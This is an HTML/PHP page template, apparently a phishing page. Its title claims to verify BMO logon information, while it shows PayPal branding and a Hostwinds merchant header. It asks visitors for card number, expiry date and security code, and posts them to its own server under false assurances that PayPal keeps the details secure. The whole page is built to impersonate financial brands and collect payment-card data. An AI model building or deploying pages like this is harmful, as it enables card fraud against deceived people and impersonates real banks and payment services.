<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify logon information - BMO</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <script src="https://kit.fontawesome.com/64664913ea.js" crossorigin="anonymous"></script>
</head>
<body class="bg-body">

  <!-- <?php
    include('views/templates/nav-light-logo.php');
  ?> -->

  <div class="container" style="max-width: 950px; margin-top: 100px; margin-bottom: 40px;">
    <div class="row mt-4 d-flex flex-column-reverse flex-md-row">
      <div class="col-md-6 p-4 mr-lg-6">
        <img src="/assets/media/paypal_brand.png" width="200">
        <div class="border-top border-bottom mt-3">
          <h1 class="font-size-26 mb-2 mt-4">Information from hostwinds</h1>
          <p class="mb-4">Hostwinds Services</p>
        </div> 

        <div class="">
          <h1 class="font-size-26 mb-2 mt-4">Pay with debit or credit card</h1>
          <p class="mb-4">We don't share your financial details with the merchant</p>
        </div> 

        <!-- select country -->
        <div class="form-floating mb-3">
          <select class="form-select" id="floatingSelect" aria-label="Floating label select example">
            <option selected>United States</option>
            <option value="1">Ukraine</option>
            <option value="2">United Kindom</option>
            <option value="3">Hong Kong</option>
          </select>
          <label class="text-secondary fw-bold" for="floatingSelect">Country/Region</label>
        </div>
        
        <!-- card types -->
        <div class="bg-light d-flex flex-row justify-content-start p-3 rounded mb-3 border">
          <img class="mx-1" src="/assets/media/card1.png" width="24"/>
          <img class="mx-1" src="/assets/media/card2.png" width="24"/>
          <img class="mx-1" src="/assets/media/card3.png" width="24"/>
          <img class="mx-1" src="/assets/media/card4.png" width="24"/>
        </div>

        <!-- form -->
        <form method="POST" novalidate class="needs-validation" action="/">
          <div class="mb-3">
            <div class="form-floating mb-3">
              <input required type="text" class="floatingInput form-control" id="card-number" placeholder="Card Number">
              <label class="text-secondary fw-bold" for="floatingInput">Card Number</label>
            </div>
            <div id="validationServerBMOFeedback" class="invalid-feedback b-0">
                Please enter all 16 digits of your credit card.
            </div>
          </div>

          <!-- Expires and CSC -->
          <div class="d-flex gap-3 flex-row justify-content-between">
              <div class="mb-3 w-100">
                <div class="form-floating mb-3">
                  <input required type="month" min="2022-11" class="floatingInput form-control" id="card-expiration" placeholder="Card Number">
                  <label class="text-secondary fw-bold" for="floatingInput">Expires</label>
                </div>
                <!-- <input required type="month" min="2022-11" class="form-control py-3 pl-3 pr-4" id="card-expiration" placeholder="Expires"> -->
                <div id="validationServerDateFeedback" class="invalid-feedback b-0">
                    Please enter your credit card expiry date.
                </div>
              </div>
              
              <div class="w-100">
                <div class="d-flex justify-content-between align-items-center position-relative">
                  <div class="form-floating mb-3">
                    <input required type="text" maxlength="3" class="floatingInput form-control" id="card-validation-num" placeholder="CSC">
                    <label class="text-secondary fw-bold" for="floatingInput">CSC</label>
                  </div>
                  <img src="/assets/media/scs_img.png" width="30" height="24" class="position-absolute" style="right: 10px">
                </div>
                <div id="validationServerDateFeedback" class="invalid-feedback b-0">
                    Please enter your Credit Card Validation number.
                </div>
              </div>
          </div>

          <!-- continue button -->
          <input class="btn btn-next mt-3 py-2 fs-6 fw-bold  rounded-pill" type="submit" value="Pay">
        </form>
      </div>

      <div class="col-md-6 mb-3 d-flex flex-column justify-content-center align-items-center text-center p-3 px-lg-5">
        <img style="max-width: 252px" src="/assets/media/securty_img.png" alt="Card cheque illustration">
        <h1 class="mt-3">Paypal is the Safer, easier way to pay</h1>
        <p>No matter where you shop, we keep your financial information secure</p>
      </div>
    </div>
  </div>

  <?php
    include('views/templates/footer.php');
  ?>


  <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" 
        integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" 
        crossorigin="anonymous"></script>
        
  <script src="/assets/js/main.js"></script>

</body>
</html>
